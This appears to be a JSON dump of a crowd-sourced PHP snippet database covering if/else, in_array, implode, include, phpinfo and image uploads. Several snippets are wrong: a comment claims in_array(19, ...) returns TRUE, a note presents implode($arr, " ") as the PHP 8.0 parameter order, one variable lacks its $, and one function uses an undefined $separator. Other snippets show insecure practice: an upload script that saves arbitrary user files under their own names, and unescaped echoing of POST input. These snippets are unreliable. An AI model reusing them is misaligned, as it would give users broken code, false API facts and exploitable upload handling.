    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3738,
    "keyword": null,
    "link": null,
    "title": " php http method",
    "description": "if ($_SERVER['REQUEST_METHOD'] === 'POST') {      // The request is using the POST method }\n$_SERVER['REQUEST_METHOD'];\n",
    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3739,
    "keyword": null,
    "link": null,
    "title": " php if",
    "description": "if ($a > $b) {     echo \"a is bigger than b\"; } elseif ($a == $b) {     echo \"a is equal to b\"; } else {     echo \"a is smaller than b\"; }\n <?php if ($a > $b) {   echo \"a is bigger than b\";   $b = $a; } ?>  \n easy way to execute conditional html / javascript / css / other language code with php if else:  <?php if (condition): ?>  html code to run if condition is true  <?php else: ?>  html code to run if condition is false  <?php endif ?>  \nif (condition) {   expression }\n",
    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3740,
    "keyword": null,
    "link": null,
    "title": " php if $ POST",
    "description": "if($_SERVER['REQUEST_METHOD'] == 'POST') {}\nif( isset($_POST['fromPerson']) ) {      $fromPerson = '+from:'.$_POST['fromPerson'];      echo $fromPerson; }  //Note: This resolves as true even if all $_POST values are empty strings if (!empty($_POST)) {     // handle post data     $fromPerson = '+from:'.$_POST['fromPerson'];     echo $fromPerson; }\n",
    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3741,
    "keyword": null,
    "link": null,
    "title": " php if array has mroe than one subarray",
    "description": "if (count($arr) > 1) {      .... }\n",
    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3742,
    "keyword": null,
    "link": null,
    "title": " php if b",
    "description": "$a = random_int(0, 10); $b = random_int(0, 10); if ($a > $b) {   echo 'a is greater than b'; } elseif ($a == $b) {   echo 'a is equal to b'; } else {   echo 'a is less than b'; }\n#Conditionals  <?php     #Conditionals     /*     == equals     === identical     < less than     > greater than     <= less than or equal to     >= greate than or equal to     != not equal to     !== not identrical     */     $num = 5;      #if($num == 5){      #   echo '5 passed';     #}elseif($num == 6){    #     echo '6 passed';   #  }else{  #       echo'did not pass'; #    }      #nesting If Statements          if($num>4){         if($num < 10){             echo \"$num passed<br>\";         }     }     /*     Logical operators can be used      instead of what is above      and     &&     or      ||     xor          means one has to be true but not both     */     if($num >4 && $num <10){         echo \"$num passed using Logical operators\";     }     /*     Switch tests for value and then find     a match and do something     */     $favColor = 'pink';      switch($favColor){     case 'red':         echo '<br>Your favorite color is red';         break;     case 'green':         echo '<br>OH NO!! Your favorite color is green';         break;     case 'blue':         echo '<br>Kool!! Your favorite color is blue';         break;     default:         echo '<br>Yikes! Your favorite color is something else';              }  ?> \n$a = true;  if(!$a) { \techo \"False\"; // Will return this } else { \techo \"True\"; }\n",
    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3743,
    "keyword": null,
    "link": null,
    "title": " php if divisible by 30",
    "description": "if ($variable % 30 == 0) {     echo 'This number is divisible by 30.'; };\n",
    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3744,
    "keyword": null,
    "link": null,
    "title": " php if else",
    "description": "<?php if ($a > $b) {     echo \"a is bigger than b\"; } elseif ($a == $b) {     echo \"a is equal to b\"; } else {     echo \"a is smaller than b\"; } ?>\n <?php if ($a > $b) {     echo \"a is bigger than b\"; } elseif ($a == $b) {     echo \"a is equal to b\"; } else {     echo \"a is smaller than b\"; } ?>  \n <?php if ($a > $b) {   echo \"a is bigger than b\";   $b = $a; } ?>  \n$a = random_int(0, 10); $b = random_int(0, 10); if ($a > $b) {   echo 'a is greater than b'; } elseif ($a == $b) {   echo 'a is equal to b'; } else {   echo 'a is less than b'; }\n <?php if ($a > $b) {   echo \"a is greater than b\"; } else {   echo \"a is NOT greater than b\"; } ?>  \n<?php $t = date(\"H\");  if ($t < \"20\") {   echo \"Have a good day!\"; } ?>\n",
    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3745,
    "keyword": null,
    "link": null,
    "title": " php if elseif",
    "description": "<?php if ($a > $b) {     echo \"a is bigger than b\"; } elseif ($a == $b) {     echo \"a is equal to b\"; } else {     echo \"a is smaller than b\"; } ?>\n <?php if ($a > $b) {     echo \"a is bigger than b\"; } elseif ($a == $b) {     echo \"a is equal to b\"; } else {     echo \"a is smaller than b\"; } ?>  \n$a = random_int(0, 10); $b = random_int(0, 10); if ($a > $b) {   echo 'a is greater than b'; } elseif ($a == $b) {   echo 'a is equal to b'; } else {   echo 'a is less than b'; }\n<?php $t = date(\"H\");  if ($t < \"20\") {   echo \"Have a good day!\"; } ?>\n re: #80305  Again useful for newbies:  if you need to compare a variable with a value, instead of doing  <?php if ($foo == 3) bar(); ?>  do  <?php if (3 == $foo) bar(); ?>  this way, if you forget a =, it will become  <?php if (3 = $foo) bar(); ?>  and PHP will report an error. \n",
    "reg_date": "2021-10-12T10:18:31.000Z"
  },
  {
    "id": 3746,
    "keyword": null,
    "link": null,
    "title": " php if elseif g",
    "description": "$a = random_int(0, 10); $b = random_int(0, 10); if ($a > $b) {   echo 'a is greater than b'; } elseif ($a == $b) {   echo 'a is equal to b'; } else {   echo 'a is less than b'; }\n",
    "reg_date": "2021-10-12T10:18:32.000Z"
  },
  {
    "id": 3747,
    "keyword": null,
    "link": null,
    "title": " php if in array",
    "description": "$myArr = [38, 18, 10, 7, \"15\"];  echo in_array(10, $myArr); // TRUE echo in_array(19, $myArr); // TRUE  // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\n<?php $os = array(\"Apple\", \"Banana\", \"Lemon\"); if (in_array(\"Apple\", $os)) {     echo \"Yeah. Exist Apple\"; } if (!in_array(\"Buleberry\", $os)) {     echo \"Oh, Don't Exist Blueberry!!!\"; } ?>\n$colors = array(\"red\", \"blue\", \"green\");    if (in_array(\"red\", $colors)) {  \techo \"found red in array\";  } \n<?php /** in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool */  $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Got Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Got mac\"; } ?>  \n<?php $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Existe Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Existe mac\"; } ?>\n$os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Got Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Got mac\"; }\n",
    "reg_date": "2021-10-12T10:18:32.000Z"
  },
  {
    "id": 3748,
    "keyword": null,
    "link": null,
    "title": " php if input is empty",
    "description": "/*   =============Input Type File============= */ $is_uploading = $_FILES[\"inputfilename\"][\"error\"]; /*   the variable $is_uploading has value either 0 or 4   0 => the user is uploading specific files or images   4 => user is not uploading anything */ $can_pass = $is_uploading == 0 ? true : false; if($can_pass){   echo \"You can Pass\"; } else{   echo \"Please upload. Your request has empty files.\"; }\n$a = empty($a) ? \"Default value\" : $a;\n",
    "reg_date": "2021-10-12T10:18:32.000Z"
  },
  {
    "id": 3749,
    "keyword": null,
    "link": null,
    "title": " php if is json object",
    "description": "function isJson($string) {  json_decode($string);  return (json_last_error() == JSON_ERROR_NONE); }\n//Simple if (is_object(json_decode($var))) {    .... }  //Else var $x = json_decode($var); var $y = is_object($x)?$x:....;  //Better function json_validate($string) {     // decode the JSON data     $result = json_decode($string);      // switch and check possible JSON errors     switch (json_last_error()) {         case JSON_ERROR_NONE:             $error = ''; // JSON is valid // No error has occurred             break;         case JSON_ERROR_DEPTH:             $error = 'The maximum stack depth has been exceeded.';             break;         case JSON_ERROR_STATE_MISMATCH:             $error = 'Invalid or malformed JSON.';             break;         case JSON_ERROR_CTRL_CHAR:             $error = 'Control character error, possibly incorrectly encoded.';             break;         case JSON_ERROR_SYNTAX:             $error = 'Syntax error, malformed JSON.';             break;         // PHP >= 5.3.3         case JSON_ERROR_UTF8:             $error = 'Malformed UTF-8 characters, possibly incorrectly encoded.';             break;         // PHP >= 5.5.0         case JSON_ERROR_RECURSION:             $error = 'One or more recursive references in the value to be encoded.';             break;         // PHP >= 5.5.0         case JSON_ERROR_INF_OR_NAN:             $error = 'One or more NAN or INF values in the value to be encoded.';             break;         case JSON_ERROR_UNSUPPORTED_TYPE:             $error = 'A value of a type that cannot be encoded was given.';             break;         default:             $error = 'Unknown JSON error occured.';             break;     }      if ($error !== '') {         // throw the Exception or exit // or whatever :)         exit($error);     }     // everything is OK     return $result; } $output = json_validate($json);\n@json_decode($page_str); $json_OK=\tjson_last_error() == JSON_ERROR_NONE; \n",
    "reg_date": "2021-10-12T10:18:32.000Z"
  },
  {
    "id": 3750,
    "keyword": null,
    "link": null,
    "title": " php if negative make positive",
    "description": "<?php echo(abs(6.7) . \"<br>\"); echo(abs(-6.7) . \"<br>\"); echo(abs(-3) . \"<br>\"); echo(abs(3)); ?>\n",
    "reg_date": "2021-10-12T10:18:32.000Z"
  },
  {
    "id": 3751,
    "keyword": null,
    "link": null,
    "title": " php if no imagee exists",
    "description": "<?php $image_path_filename = '/path/images/donate.jpg';  if (file_exists($image_path_filename)) {     echo \"The file $image_path_filename exists\"; } else {     echo \"The file $image_path_filename does not exist\"; } ?>\n",
    "reg_date": "2021-10-12T10:18:32.000Z"
  },
  {
    "id": 3752,
    "keyword": null,
    "link": null,
    "title": " php if short form",
    "description": "$is_admin = ($user['permissions'] == 'admin') ? true : false;\n<?php echo ($qte > 0) ? $qte : 0; ?>\n",
    "reg_date": "2021-10-12T10:18:32.000Z"
  },
  {
    "id": 3753,
    "keyword": null,
    "link": null,
    "title": " php if shorthand",
    "description": "<?php $v = 1;  $r = (1 == $v) ? 'Yes' : 'No'; // $r is set to 'Yes' $r = (3 == $v) ? 'Yes' : 'No'; // $r is set to 'No'  echo (1 == $v) ? 'Yes' : 'No'; // 'Yes' will be printed  // and since PHP 5.3 $v = 'My Value'; $r = ($v) ?: 'No Value'; // $r is set to 'My Value' because $v is evaluated to TRUE  $v = ''; echo ($v) ?: 'No Value'; // 'No Value' will be printed because $v is evaluated to FALSE ?> \n$errors = array(             0 => 'OK',             1 => 'Неверный xml',             2 => 'Широта не указана',             3 => 'Долгота не указана',             4 => 'Дата и время запроса не указаны',             5 => 'Точность не указана',             6 => 'Идентификатор телефона не указан',             7 => 'Идентификатор телефона не найден',             8 => 'Неверная широта',             9 => 'Неверная долгота',             10 => 'Неверная точность',             11 => 'Заказы не найдены',             12 => 'Неверные дата и время запроса',             13 => 'Ошибка mysql',             14 => 'Неизвестная функция',             15 => 'Тариф не найден',             18 => 'Город отправления не указан',             19 => 'Город назначения не указан',             20 => 'Неверная масса',             21 => 'Город отправления не найден',             22 => 'Город назначения не найден',             23 => 'Масса не указана',             24 => 'Логин не указан',             25 => 'Ошибка авторизации',             26 => 'Логин уже существует',             27 => 'Клиент уже существует',             28 => 'Адрес не указан',             29 => 'Более не поддерживается',             30 => 'Настройка sip не выполнена',             31 => 'Телефон не указан',             32 => 'Телефон курьера не указан',             33 => 'Ошибка соединения',             34 => 'Неверный номер',             35 => 'Неверный номер',             36 => 'Ошибка определения тарифа',             37 => 'Ошибка определения тарифа',             38 => 'Тариф не найден',             39 => 'Тариф не найден',         );          return isset($errors[$code]) ? $errors[$code] : 'Неизвестная ошибка';\n$is_admin = ($user['permissions'] == 'admin') ? true : false;\n$y = $x ? \"true\" : \"false\";\n<?php echo ($qte > 0) ? $qte : 0; ?>\n",
    "reg_date": "2021-10-12T10:18:33.000Z"
  },
  {
    "id": 3754,
    "keyword": null,
    "link": null,
    "title": " php if string is already in database",
    "description": "$check_email = $pdo->query(\"SELECT * FROM users WHERE email='test@example.com'\"); if ($check_email) {     // found }\n",
    "reg_date": "2021-10-12T10:18:33.000Z"
  },
  {
    "id": 3755,
    "keyword": null,
    "link": null,
    "title": " php if url contains",
    "description": "if(strpos($_SERVER['REQUEST_URI'], \"string\")) {   ... }\npreg_match('/(http|ftp|mailto)/', $string, $matches); var_dump($matches);\nif (strpos($_SERVER['REQUEST_URI'], \"url word\") !== false){ // code }\nfunction urlExists($url=NULL)     {         if($url == NULL) return false;         $ch = curl_init($url);         curl_setopt($ch, CURLOPT_TIMEOUT, 5);         curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);         curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);         $data = curl_exec($ch);         $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);         curl_close($ch);          if($httpcode>=200 && $httpcode<300){             return true;         } else {             return false;         }     } \n$url = 'http://' . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];  if (!strpos($url,'mysql')) { echo 'No mysql.'; //swapped with other echo statement } else { echo 'Mysql exists.'; }\n",
    "reg_date": "2021-10-12T10:18:33.000Z"
  },
  {
    "id": 3756,
    "keyword": null,
    "link": null,
    "title": " php if variable equals",
    "description": "<?php \t// if given an variable to check or validate   \t$text = \"issac\"; \tif($text == \"issac\"){     \techo \"Cool\";     }else{     \techo \"Huston, We've got a problem\";     }  // result : Cool  //Symbol Guide:  // == ->> Equals to // === ->> Strictly Equals to // != ->> Not Equals to // !== ->> Strictly not equals to  // Hope this helps Godspeed. ?>\n",
    "reg_date": "2021-10-12T10:18:33.000Z"
  },
  {
    "id": 3757,
    "keyword": null,
    "link": null,
    "title": " php ifelse",
    "description": "<?php if ($a > $b) {     echo \"a is bigger than b\"; } elseif ($a == $b) {     echo \"a is equal to b\"; } else {     echo \"a is smaller than b\"; } ?>\nif ($a > $b) {     echo \"a is bigger than b\"; } elseif ($a == $b) {     echo \"a is equal to b\"; } else {     echo \"a is smaller than b\"; }\n <?php if ($a > $b) {   echo \"a is bigger than b\";   $b = $a; } ?>  \n$a = random_int(0, 10); $b = random_int(0, 10); if ($a > $b) {   echo 'a is greater than b'; } elseif ($a == $b) {   echo 'a is equal to b'; } else {   echo 'a is less than b'; }\nif (condition) {   expression }\n",
    "reg_date": "2021-10-12T10:18:33.000Z"
  },
  {
    "id": 3758,
    "keyword": null,
    "link": null,
    "title": " php image to base64",
    "description": "$path = 'myfolder/myimage.png'; $type = pathinfo($path, PATHINFO_EXTENSION); $data = file_get_contents($path); $base64 = 'data:image/' . $type . ';base64,' . base64_encode($data); \n$img = $_POST['img']; $img = str_replace('data:image/png;base64,', '', $img); $img = str_replace(' ', '+', $img); $data = base64_decode($img); $file = \"images/\" . uniqid() . '.png'; $success = file_put_contents($file, $data);\n",
    "reg_date": "2021-10-12T10:18:33.000Z"
  },
  {
    "id": 3759,
    "keyword": null,
    "link": null,
    "title": " php image upload write to server",
    "description": "<?php error_reporting(0);  $msg = \"\";  if ( isset( $_POST['upload']) ) {  \t$filename = $_FILES[\"uploadfile\"][\"name\"]; \t$tempname = $_FILES[\"uploadfile\"][\"tmp_name\"];     $folder   = $filename;      if ( move_uploaded_file( $tempname, $folder ) ) {         $msg = \"Image uploaded successfully\";     } else{         $msg = \"Failed to upload image\"; \t} } ?>  <!DOCTYPE html> <html>     <head>     <title>Image Upload</title>     </head>     <body>      <h2><?php echo $msg; ?></h2>     <form method=\"POST\" action=\"\" enctype=\"multipart/form-data\">         <input type=\"file\" name=\"uploadfile\"/>         <button type=\"submit\" name=\"upload\">UPLOAD</button>     </form>     </body> </html>\n<?php    if(isset($_FILES['image'])){       $errors= array();       $file_name = $_FILES['image']['name'];       $file_size =$_FILES['image']['size'];       $file_tmp =$_FILES['image']['tmp_name'];       $file_type=$_FILES['image']['type'];       $file_ext=strtolower(end(explode('.',$_FILES['image']['name'])));              $extensions= array(\"jpeg\",\"jpg\",\"png\");              if(in_array($file_ext,$extensions)=== false){          $errors[]=\"extension not allowed, please choose a JPEG or PNG file.\";       }              if($file_size > 2097152){          $errors[]='File size must be excately 2 MB';       }              if(empty($errors)==true){          move_uploaded_file($file_tmp,\"images/\".$file_name);          echo \"Success\";       }else{          print_r($errors);       }    } ?>\n",
    "reg_date": "2021-10-12T10:18:33.000Z"
  },
  {
    "id": 3760,
    "keyword": null,
    "link": null,
    "title": " php imagick xampp windows",
    "description": "Here is a link to a video which shows how to install php imagick on your Windows (10) Xampp installation. https://www.youtube.com/watch?v=qZ9_rq6c9uY\n",
    "reg_date": "2021-10-12T10:18:33.000Z"
  },
  {
    "id": 3761,
    "keyword": null,
    "link": null,
    "title": " php implode",
    "description": "$array = array('banana', 'strawberry', 'apple'); comma_separated  = implode(\",\", $array); echo comma_separated; // banana,strawberry,apple\n$arr = array('Hello','World!','Beautiful','Day!'); echo implode(\" \",$arr); // Outputs: 'Hello World! Beautiful Day!'\n$values = array_map('array_pop', $array); $imploded = implode(',', $values); \n$colors = array(\"red\",\"blue\",\"green\"); $colorsCSV= \"'\".implode(\"','\",$colors).\"'\"; //$colorsCSV: 'red','blue','green'\n$arr = ['Thor','Captain America','Iron Man']; echo implode(', ',$arr); // \"Thor, Captain America, Iron Man\"\n// from PHP 8.0 (order parameters has been changed)  $arr = array('Hello','World!','Beautiful','Day!');  echo implode($arr, \" \");\n",
    "reg_date": "2021-10-12T10:18:33.000Z"
  },
  {
    "id": 3762,
    "keyword": null,
    "link": null,
    "title": " php implode array",
    "description": "$array = array('banana', 'strawberry', 'apple'); comma_separated  = implode(\",\", $array); echo comma_separated; // banana,strawberry,apple\n$arr = array('Hello','World!','Beautiful','Day!'); echo implode(\" \",$arr); // Outputs: 'Hello World! Beautiful Day!'\n$values = array_map('array_pop', $array); $imploded = implode(',', $values); \n$arr = array('Hello','World!','Beautiful','Day!'); echo join(\",\",$arr);\n$colors = array(\"red\",\"blue\",\"green\"); $colorsCSV= \"'\".implode(\"','\",$colors).\"'\"; //$colorsCSV: 'red','blue','green'\n$arr = ['Thor','Captain America','Iron Man']; echo implode(', ',$arr); // \"Thor, Captain America, Iron Man\"\n",
    "reg_date": "2021-10-12T10:18:33.000Z"
  },
  {
    "id": 3763,
    "keyword": null,
    "link": null,
    "title": " php implode as key value of object",
    "description": "$output = implode(', ', array_map(     function ($v, $k) { return sprintf(\"%s='%s'\", $k, $v); },     $input,     array_keys($input) ));\n",
    "reg_date": "2021-10-12T10:18:34.000Z"
  },
  {
    "id": 3764,
    "keyword": null,
    "link": null,
    "title": " php implode multidimensional array",
    "description": "$users = [ \t'users' => ['user1@example.com','user2@example.com'], \t'admins' => ['admin1@example.com', 'admin2@example.com'] ];  // function to convert array of arrays to string function implodeArrayofArrays($array, $glue  = ', ') {         $output = '';         foreach ($array as $subarray) {             $output .= implode($separator, $subarray);         }         return $output; }  echo implodeArrayofArrays($users);  // \"user1@example.com, user2@example.com, admin1@example.com, admin2@example.com\"\n",
    "reg_date": "2021-10-12T10:18:34.000Z"
  },
  {
    "id": 3765,
    "keyword": null,
    "link": null,
    "title": " php import function from another file",
    "description": "File1.php : <?php   function first($int, $string){ //function parameters, two variables.     return $string;  //returns the second argument passed into the function   } ?>    File2.php : <?php   include 'File1.php';   echo first(1,\"omg lol\"); //returns omg lol; ?>\n",
    "reg_date": "2021-10-12T10:18:34.000Z"
  },
  {
    "id": 3766,
    "keyword": null,
    "link": null,
    "title": " php in array",
    "description": "$myArr = [38, 18, 10, 7, \"15\"];  echo in_array(10, $myArr); // TRUE echo in_array(19, $myArr); // TRUE  // Without strict check echo in_array(\"18\", $myArr); // TRUE // With strict check echo in_array(\"18\", $myArr, true); // FALSE\n<?php $os = array(\"Apple\", \"Banana\", \"Lemon\"); if (in_array(\"Apple\", $os)) {     echo \"Yeah. Exist Apple\"; } if (!in_array(\"Buleberry\", $os)) {     echo \"Oh, Don't Exist Blueberry!!!\"; } ?>\n$colors = array(\"red\", \"blue\", \"green\");    if (in_array(\"red\", $colors)) {  \techo \"found red in array\";  } \n$errors = array(             0 => 'OK',             1 => 'Неверный xml',             2 => 'Широта не указана',             3 => 'Долгота не указана',             4 => 'Дата и время запроса не указаны',             5 => 'Точность не указана',             6 => 'Идентификатор телефона не указан',             7 => 'Идентификатор телефона не найден',             8 => 'Неверная широта',             9 => 'Неверная долгота',             10 => 'Неверная точность',             11 => 'Заказы не найдены',             12 => 'Неверные дата и время запроса',             13 => 'Ошибка mysql',             14 => 'Неизвестная функция',             15 => 'Тариф не найден',             18 => 'Город отправления не указан',             19 => 'Город назначения не указан',             20 => 'Неверная масса',             21 => 'Город отправления не найден',             22 => 'Город назначения не найден',             23 => 'Масса не указана',             24 => 'Логин не указан',             25 => 'Ошибка авторизации',             26 => 'Логин уже существует',             27 => 'Клиент уже существует',             28 => 'Адрес не указан',             29 => 'Более не поддерживается',             30 => 'Настройка sip не выполнена',             31 => 'Телефон не указан',             32 => 'Телефон курьера не указан',             33 => 'Ошибка соединения',             34 => 'Неверный номер',             35 => 'Неверный номер',             36 => 'Ошибка определения тарифа',             37 => 'Ошибка определения тарифа',             38 => 'Тариф не найден',             39 => 'Тариф не найден',         );          return isset($errors[$code]) ? $errors[$code] : 'Неизвестная ошибка';\nconst names = ['John', 'Paul', 'George', 'Ringo', 'John'];  let x = (names) => names.filter((v,i) => names.indexOf(v) === i) x(names); // 'John', 'Paul', 'George', 'Ringo' \n<?php /** in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] ) : bool */  $os = array(\"Mac\", \"NT\", \"Irix\", \"Linux\"); if (in_array(\"Irix\", $os)) {     echo \"Got Irix\"; } if (in_array(\"mac\", $os)) {     echo \"Got mac\"; } ?>  \n",
    "reg_date": "2021-10-12T10:18:34.000Z"
  },
  {
    "id": 3767,
    "keyword": null,
    "link": null,
    "title": " php in html",
    "description": "echo \"Hello World\";\nBasic PHP Syntax A PHP script can be placed anywhere in the document.  A PHP script starts with <?php and ends with ?>:  <?php // PHP code goes here ?> The default file extension for PHP files is \".php\".  A PHP file normally contains HTML tags, and some PHP scripting code.    Example <!DOCTYPE html> <html> <body>  <h1>Php in html</h1>  <?php echo \"Hello World!\"; ?>  </body> </html>\n<body> Hello, today is <?php echo date('l, F jS, Y'); ?>. </body>\n//Display html code in php <?php echo'<form action=\"StorePage.php\" method=\"post\">'; ?>\n",
    "reg_date": "2021-10-12T10:18:34.000Z"
  },
  {
    "id": 3768,
    "keyword": null,
    "link": null,
    "title": " php in javascript",
    "description": "If your whole JavaScript code gets processed by PHP, then you can do it just like that.  If you have individual .js files, and you don't want PHP to process them (for example, for caching reasons), then you can just pass variables around in JavaScript.  For example, in your index.php (or wherever you specify your layout), you'd do something like this:  <script type=\"text/javascript\">     var my_var = <?php echo json_encode($my_var); ?>; </script> You could then use my_var in your JavaScript files.  This method also lets you pass other than just simple integer values, as json_encode() also deals with arrays, strings, etc. correctly, serialising them into a format that JavaScript can use.\n",
    "reg_date": "2021-10-12T10:18:34.000Z"
  },
  {
    "id": 3769,
    "keyword": null,
    "link": null,
    "title": " php include",
    "description": "<?php \tinclude 'archive.php'; ?>\n<!-- Wrap inside the head tag --> <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js\"></script>\n// Include a file, if it can't be found: continue. <?php include 'mainfile.php'; ?>    // Alternatively: Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?>\n<body> <?php      define('ROOT_PATH', dirname(__DIR__).'/');     include ROOT_PATH.'header.php';     include ROOT_PATH.'main.php';     include ROOT_PATH.'footer.php'; ?> </body>\n// Require a file to be imported or quit if it can't be found <?php  require 'requiredfile.php'; ?>\ninclude 'docName.php';\n",
    "reg_date": "2021-10-12T10:18:34.000Z"
  },
  {
    "id": 3770,
    "keyword": null,
    "link": null,
    "title": " php include file in parent directory",
    "description": "//If your server is not resolving the file from the parent directory using include '../somefilein_parent.php'  //try this (using the parent directory relative to the script): include __DIR__ . \"/../somefilein_parent.php\";\n",
    "reg_date": "2021-10-12T10:18:34.000Z"
  },
  {
    "id": 3771,
    "keyword": null,
    "link": null,
    "title": " php include file path",
    "description": "<body> <?php      define('ROOT_PATH', dirname(__DIR__).'/');     include ROOT_PATH.'header.php';     include ROOT_PATH.'main.php';     include ROOT_PATH.'footer.php'; ?> </body>\n",
    "reg_date": "2021-10-12T10:18:34.000Z"
  },
  {
    "id": 3772,
    "keyword": null,
    "link": null,
    "title": " php include file path w3schools",
    "description": "<body> <?php      define('ROOT_PATH', dirname(__DIR__).'/');     include ROOT_PATH.'header.php';     include ROOT_PATH.'main.php';     include ROOT_PATH.'footer.php'; ?> </body>\n",
    "reg_date": "2021-10-12T10:18:35.000Z"
  },
  {
    "id": 3773,
    "keyword": null,
    "link": null,
    "title": " php include html",
    "description": "<!DOCTYPE html>  <html>   <head>   \t<title>External PHP File</title>   </head>   <body>   \t<?php include 'example.php';?>   <body> </html>\n<body> <?php      define('ROOT_PATH', dirname(__DIR__).'/');     include ROOT_PATH.'header.php';     include ROOT_PATH.'main.php';     include ROOT_PATH.'footer.php'; ?> </body>\n",
    "reg_date": "2021-10-12T10:18:35.000Z"
  },
  {
    "id": 3774,
    "keyword": null,
    "link": null,
    "title": " php include multiple files at once",
    "description": "array_map( function ($a) { return include($a); }, array('xx.php','yy.php','zz.php'));\n",
    "reg_date": "2021-10-12T10:18:35.000Z"
  },
  {
    "id": 3775,
    "keyword": null,
    "link": null,
    "title": " php include once inside a function?",
    "description": "//yes this works    function derp(){include_once(yourfile.php);}\n",
    "reg_date": "2021-10-12T10:18:35.000Z"
  },
  {
    "id": 3776,
    "keyword": null,
    "link": null,
    "title": " php increase number in file by one",
    "description": "<?php $file = 'count.txt'; $fdata = file_get_contents ( $file ); $fdata = intval($fdata) + 1; file_put_contents($file, $fdata); ?>\n",
    "reg_date": "2021-10-12T10:18:35.000Z"
  },
  {
    "id": 3777,
    "keyword": null,
    "link": null,
    "title": " php increment variable",
    "description": "$var = 0; // use value (0) THEN increment by one $var++; // increment by one THEN use value (1) ++$var;  // aside: increment by custom amount (1 emulates the above) $var += 1; $var += $step;\n// To increment a variable by 1 $var++;\n$variable++;\n",
    "reg_date": "2021-10-12T10:18:35.000Z"
  },
  {
    "id": 3778,
    "keyword": null,
    "link": null,
    "title": " php index array",
    "description": "<?php $cars = array(\"Volvo\", \"BMW\", \"Toyota\");  echo \"I like \" . $cars[0] . \", \" . $cars[1] . \" and \" . $cars[2] . \".\"; ?>\n",
    "reg_date": "2021-10-12T10:18:35.000Z"
  },
  {
    "id": 3779,
    "keyword": null,
    "link": null,
    "title": " php index of last element in array",
    "description": "<?php  $source_array = ['key1' => 'value1', 'key2' => 'value2', 'key3' => 'value3'];  $result = end($source_array);  echo \"Last element: \".$result;  ?>\n<?php  $source_array = [   'key1' => 'value1',   'key2' => 'value2',   'key3' => 'value3' ];  echo \"Last index: \" . array_key_last($source_array);  ?>\necho end(['Gon', 'Killua', 'Hisoka']) // print Hisoka\n",
    "reg_date": "2021-10-12T10:18:35.000Z"
  },
  {
    "id": 3780,
    "keyword": null,
    "link": null,
    "title": " php indexof",
    "description": " <?php $mystring = 'abc'; $findme   = 'a'; $pos = strpos($mystring, $findme);  // Note our use of ===.  Simply == would not work as expected // because the position of 'a' was the 0th (first) character. if ($pos === false) {     echo \"The string '$findme' was not found in the string '$mystring'\"; } else {     echo \"The string '$findme' was found in the string '$mystring'\";     echo \" and exists at position $pos\"; } ?>  \nstrrpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int\nstrrpos ( string $haystack , mixed $needle [, int $offset = 0 ] ) : int or False return <?php $foo = \"0123456789a123456789b123456789c\";  // Looking for '0' from the 0th byte (from the beginning) var_dump(strrpos($foo, '0', 0));  // Looking for '0' from the 1st byte (after byte \"0\") var_dump(strrpos($foo, '0', 1));  $str = 'This is Main String';   if (strpos($str, 'This') !== false) {     echo 'true'; } \n",
    "reg_date": "2021-10-12T10:18:35.000Z"
  },
  {
    "id": 3781,
    "keyword": null,
    "link": null,
    "title": " php info",
    "description": "ini_set('display_errors', '1'); ini_set('display_startup_errors', '1'); error_reporting(E_ALL);\n<?php // Show all information, defaults to INFO_ALL phpinfo(); ?>\nphpinfo();\n// Show all information, defaults to INFO_ALL phpinfo();\nphpinfo(INFO_MODULES);\n",
    "reg_date": "2021-10-12T10:18:36.000Z"
  },
  {
    "id": 3782,
    "keyword": null,
    "link": null,
    "title": " php info file",
    "description": "<?php // Show all information, defaults to INFO_ALL phpinfo(); ?>\nphpinfo();\nphpinfo(INFO_MODULES);\n",
    "reg_date": "2021-10-12T10:18:36.000Z"
  },
  {
    "id": 3783,
    "keyword": null,
    "link": null,
    "title": " php ini set display errors",
    "description": "ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n/* Answer to: \"php error reporting\" */  ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /*   What do these lines of code do exactly?    The ini_set function will try to override the configuration found   in your PHP ini file.    The display_errors and display_startup_errors are just two of the   directives that are available. The display_errors directive will   determine if the errors will be displayed or hidden to the user.   Usually, the dispay_errors directive should be turned off after   development.    The display_startup_errors, however, is a separate directive   because the display_errors doesn&rsquo;t handle the errors that will be   encountered during PHP&rsquo;s startup sequence. The list of the   directives that can be overridden by the ini_set function is found   in the official documentation. */\n",
    "reg_date": "2021-10-12T10:18:36.000Z"
  },
  {
    "id": 3784,
    "keyword": null,
    "link": null,
    "title": " php ini set error reporting",
